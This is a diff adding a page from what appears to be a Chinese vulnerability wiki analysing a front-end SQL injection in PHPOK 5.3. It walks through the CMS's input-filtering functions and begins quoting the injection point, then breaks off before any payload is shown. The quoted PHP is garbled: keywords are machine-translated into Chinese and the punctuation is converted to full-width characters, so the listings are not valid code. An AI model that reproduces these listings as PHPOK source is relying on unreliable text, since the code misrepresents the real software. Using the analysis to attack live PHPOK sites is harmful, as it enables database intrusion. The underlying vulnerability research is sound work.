@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PHPOK 5.3 前台注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PHPOK 5.3 \u524d\u53f0\u6ce8\u5165", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+          {title: "\u8fd9\u4e00\u6bb5\u4ee3\u7801$this-\u003emodel(\\\u0027call\\\u0027)-\u003eall($siteid,\\\u0027identifier\\\u0027);\u5b9e\u73b0\u7684\u662f\u67e5\u8be2phpok\u8868\uff0c\u5176\u4e2didentifier", url: "#this-modelcall-allsiteididentifierphpokidentifier", children: [
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_5" },
+              {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PHPOK%205.5%20csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PHPOK%205.5%20csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" class="btn btn-xs btn-link">
+        PHPOK 5.5 csrf+反序列化漏洞getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        PHPOK 5.3 前台无限制注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpok-53">PHPOK 5.3 前台注入<a class="headerlink" href="#phpok-53" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>PHPOK 5.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>灵活获取参数：$this-&gt;get()方法</p>
+<p>framework / init.php＃get</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">最后的公共函数get</span><span class="err">（$</span><span class="w"> </span><span class="nx">id</span><span class="err">，$</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="p">=</span><span class="err">“</span><span class="w"> </span><span class="nx">safe</span><span class="err">”，$</span><span class="w"> </span><span class="nx">ext</span><span class="w"> </span><span class="p">=</span><span class="err">“”）</span>
+<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="c1">// PGC进入获取</span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="nx">val</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">isset</span><span class="err">（$</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="p">[</span><span class="err">$</span><span class="w"> </span><span class="nx">id</span><span class="p">]</span><span class="err">）？$</span><span class="w"> </span><span class="nx">_POST</span><span class="w"> </span><span class="p">[</span><span class="err">$</span><span class="w"> </span><span class="nx">id</span><span class="p">]</span><span class="err">：（</span><span class="nx">isset</span><span class="err">（$</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">GET</span><span class="w"> </span><span class="p">[</span><span class="err">$</span><span class="w"> </span><span class="nx">id</span><span class="p">]</span><span class="err">）？$</span><span class="w"> </span><span class="nx">_GET</span><span class="w"> </span><span class="p">[</span><span class="err">$</span><span class="w"> </span><span class="nx">id</span><span class="p">]</span><span class="err">：（</span><span class="nx">isset</span><span class="err">（$</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">COOKIE</span><span class="w"> </span><span class="p">[</span><span class="err">$</span><span class="w"> </span><span class="nx">id</span><span class="p">]</span><span class="err">）？$</span><span class="w"> </span><span class="nx">_COOKIE</span><span class="w"> </span><span class="p">[</span><span class="err">$</span><span class="w"> </span><span class="nx">id</span><span class="p">]</span><span class="err">：&#39;&#39;））</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">val</span><span class="w"> </span><span class="o">==</span><span class="err">&#39;&#39;）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="o">==</span><span class="err">&#39;</span><span class="nx">int</span><span class="err">&#39;</span><span class="o">||</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="o">==</span><span class="err">&#39;</span><span class="nx">intval</span><span class="err">&#39;</span><span class="o">||</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="o">==</span><span class="err">&#39;</span><span class="nx">float</span><span class="err">&#39;</span><span class="o">||</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="o">==</span><span class="err">&#39;</span><span class="nx">floatval</span><span class="err">&#39;）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="nx">返回0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="k">return</span><span class="err">”</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="c1">//判断内容是否有转义，所有未转义的数据都直接转义</span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="nx">addslashes</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（</span><span class="nx">function_exists</span><span class="err">（“</span><span class="w"> </span><span class="nx">get_magic_quotes_gpc</span><span class="err">”）</span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">get_magic_quotes_gpc</span><span class="err">（））</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="nx">addslashes</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（！</span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="nx">addslashes</span><span class="err">）</span><span class="p">{</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">val</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">addslashes</span><span class="err">（$</span><span class="w"> </span><span class="nx">val</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">返回</span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">format</span><span class="err">（$</span><span class="w"> </span><span class="nx">val</span><span class="err">，$</span><span class="w"> </span><span class="k">type</span><span class="err">，$</span><span class="w"> </span><span class="nx">ext</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>跟进format函数：framework / init.php＃format</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">最终的公共函数格式</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">，$</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="p">=</span><span class="err">“</span><span class="w"> </span><span class="nx">safe</span><span class="err">”，$</span><span class="w"> </span><span class="nx">ext</span><span class="w"> </span><span class="p">=</span><span class="err">“”）</span>
+<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">==</span><span class="err">“”）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">;;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（</span><span class="nx">is_array</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">））</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">foreach</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">value</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="k">if</span><span class="err">（！</span><span class="nx">is_numeric</span><span class="err">（$</span><span class="w"> </span><span class="nx">key</span><span class="err">））</span><span class="p">{</span><span class="w"> </span>
+<span class="w">                </span><span class="err">$</span><span class="w"> </span><span class="nx">key2</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">format</span><span class="err">（$</span><span class="w"> </span><span class="nx">key</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">                </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">key2</span><span class="w"> </span><span class="o">==</span><span class="err">``</span><span class="o">||</span><span class="w"> </span><span class="nx">in_array</span><span class="err">（$</span><span class="w"> </span><span class="nx">key2</span><span class="err">，</span><span class="nx">array</span><span class="err">（</span><span class="sc">&#39;＃&#39;</span><span class="err">，</span><span class="sc">&#39;＆&#39;</span><span class="err">，</span><span class="sc">&#39;％&#39;</span><span class="err">）））</span><span class="p">{</span><span class="w"> </span>
+<span class="w">                    </span><span class="nx">unset</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">[</span><span class="err">$</span><span class="w"> </span><span class="nx">key</span><span class="p">]</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">                    </span><span class="nx">继续</span><span class="p">;</span><span class="w"> </span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">[</span><span class="err">$</span><span class="w"> </span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">format</span><span class="err">（$</span><span class="w"> </span><span class="nx">value</span><span class="err">，$</span><span class="w"> </span><span class="k">type</span><span class="err">，$</span><span class="w"> </span><span class="nx">ext</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">        </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">count</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="nx">返回</span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">返回false</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="o">==</span><span class="err">&#39;</span><span class="nx">html_js</span><span class="err">&#39;</span><span class="o">||</span><span class="err">（$</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="o">==</span><span class="err">&#39;</span><span class="nx">html</span><span class="err">&#39;</span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">ext</span><span class="err">））</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">stripslashes</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">app_id</span><span class="err">！</span><span class="p">=</span><span class="err">&#39;</span><span class="nx">admin</span><span class="err">&#39;）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">lib</span><span class="err">（&#39;</span><span class="kt">string</span><span class="err">&#39;）</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">xss_clean</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">lib</span><span class="err">（&#39;</span><span class="kt">string</span><span class="err">&#39;）</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">clear_url</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">，$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">url</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">返回addslashes</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="c1">//转义去除</span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">stripslashes</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="c1">//格式化处理内容</span>
+<span class="w">    </span><span class="nx">开关</span><span class="err">（$</span><span class="w"> </span><span class="k">type</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="k">case</span><span class="err">&#39;</span><span class="nx">safe_text</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">strip_tags</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">str_replace</span><span class="err">（</span><span class="nx">array</span><span class="err">（“</span><span class="w"> </span><span class="err">\\”，“&#39;”，</span><span class="sc">&#39;“&#39;</span><span class="err">，”</span><span class="w"> </span><span class="p">&lt;</span><span class="err">“，”</span><span class="p">&gt;</span><span class="err">“），&#39;&#39;，$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">system</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="err">！</span><span class="nx">preg_match</span><span class="err">（“</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">[</span><span class="nx">a</span><span class="o">-</span><span class="nx">zA</span><span class="o">-</span><span class="nx">Z</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nx">a</span><span class="o">-</span><span class="nx">z0</span><span class="o">-</span><span class="mi">9</span><span class="nx">A</span><span class="o">-</span><span class="nx">Z</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="err">\</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">u</span><span class="err">”，$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="nx">吗</span><span class="err">？</span><span class="kc">false</span><span class="err">：$</span><span class="w"> </span><span class="nx">msg</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">id</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="err">！</span><span class="nx">preg_match</span><span class="err">（“</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">[</span><span class="nx">a</span><span class="o">-</span><span class="nx">zA</span><span class="o">-</span><span class="nx">Z</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nx">a</span><span class="o">-</span><span class="nx">z0</span><span class="o">-</span><span class="mi">9</span><span class="nx">A</span><span class="o">-</span><span class="nx">Z</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="err">\</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">u</span><span class="err">”，$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="nx">吗</span><span class="err">？</span><span class="kc">false</span><span class="err">：$</span><span class="w"> </span><span class="nx">msg</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">复选框</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">strtolower</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="o">==</span><span class="err">&#39;</span><span class="nx">on</span><span class="err">&#39;</span><span class="nx">吗</span><span class="err">？</span><span class="mi">1</span><span class="err">：$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">format</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">，&#39;</span><span class="nx">safe</span><span class="err">&#39;）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">int</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">intval</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">intval</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">intval</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">float</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">floatval</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">floatval</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">floatval</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">案例</span><span class="err">“</span><span class="nx">时间</span><span class="err">”：</span>
+
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">html</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">lib</span><span class="err">（&#39;</span><span class="kt">string</span><span class="err">&#39;）</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">safe_html</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">，$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">url</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">func</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">function_exists</span><span class="err">（$</span><span class="w"> </span><span class="nx">ext</span><span class="err">）？$</span><span class="w"> </span><span class="nx">ext</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）：</span><span class="nx">假</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">情况</span><span class="err">&#39;</span><span class="nx">text</span><span class="err">&#39;：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">strip_tags</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">打破</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">默认值</span><span class="err">：</span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">str_replace</span><span class="err">（</span><span class="nx">array</span><span class="err">（“</span><span class="w"> </span><span class="err">\\”，“&#39;”，</span><span class="sc">&#39;“&#39;</span><span class="err">，”</span><span class="w"> </span><span class="p">&lt;</span><span class="err">“，”</span><span class="p">&gt;</span><span class="err">“），</span><span class="nx">array</span><span class="err">（”＆＃</span><span class="mi">92</span><span class="p">;</span><span class="err">“，”＆＃</span><span class="mi">39</span><span class="p">;</span><span class="err">“，”＆</span><span class="nx">quot</span><span class="p">;</span><span class="w"> </span><span class="err">“，”＆</span><span class="nx">lt</span><span class="p">;</span><span class="err">“，”＆</span><span class="nx">gt</span><span class="p">;</span><span class="err">“），$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="p">=</span><span class="nx">加上斜线</span><span class="err">（$</span><span class="w"> </span><span class="nx">msg</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">返回</span><span class="err">$</span><span class="w"> </span><span class="nx">msg</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>格式默认为安全模式，也就是仅将\ \" \' \&lt; &gt;实体编码。</p>
+<p>注入点：</p>
+<p>framework / api / index_control.php＃phpok_f</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// ... </span>
+$<span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="k">get</span>（“<span class="w"> </span><span class="n">token</span>”）<span class="p">;</span><span class="w"> </span>
+<span class="k">if</span>（！$<span class="w"> </span><span class="n">token</span>）<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span>$<span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">json</span>（<span class="n">P_Lang</span>（“接口数据异常”））<span class="p">;;</span><span class="w"> </span>
+<span class="p">}</span><span class="w"> </span>
+$<span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nb">lib</span>（<span class="s">&#39;token&#39;</span>）<span class="o">-&gt;</span><span class="w"> </span><span class="n">keyid</span>（$<span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">site</span><span class="w"> </span><span class="p">[</span><span class="s">&#39;api_code&#39;</span><span class="p">]</span>）<span class="p">;</span><span class="w"> </span>
+$<span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nb">lib</span>（<span class="s">&#39;token&#39;</span>）<span class="o">-&gt;</span><span class="w"> </span><span class="n">decode</span>（$<span class="w"> </span><span class="n">token</span>）<span class="p">;</span><span class="w"> </span>
+<span class="k">if</span>（！$<span class="w"> </span><span class="n">info</span>）<span class="p">{</span><span class="w"> </span>
